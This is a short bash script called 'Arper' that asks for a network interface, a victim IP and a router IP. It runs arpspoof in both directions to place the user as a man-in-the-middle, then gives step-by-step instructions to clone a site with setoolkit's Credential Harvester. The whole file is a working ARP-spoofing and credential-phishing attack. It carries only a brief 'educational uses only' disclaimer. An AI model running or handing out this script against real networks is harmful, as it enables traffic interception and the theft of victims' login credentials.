echo Arper By: m5kro
echo 'This is used in MITM attacks.'
echo 'This script is for educational uses only please dont do anything stupid with it.'
echo 'More updates in the future.'
echo Which interface would you like to use?
read interface
echo What is the victims ip?
read victimip
echo What is the router ip?
read routerip
xterm -e arpspoof -i $interface -t $victimip $routerip &
xterm -e arpspoof -i $interface -t $routerip $victimip &
echo Now open setoolkit and use their site cloner to start a webserver on your machine.
echo You can do so by typing in setoolkit then going into Social-Engineering Attacks.
echo Then to Website Attack Vectors.
echo Then go to Credential Harvester Attack Method.
echo Afterwards go to Site Cloner then follow their instructions.
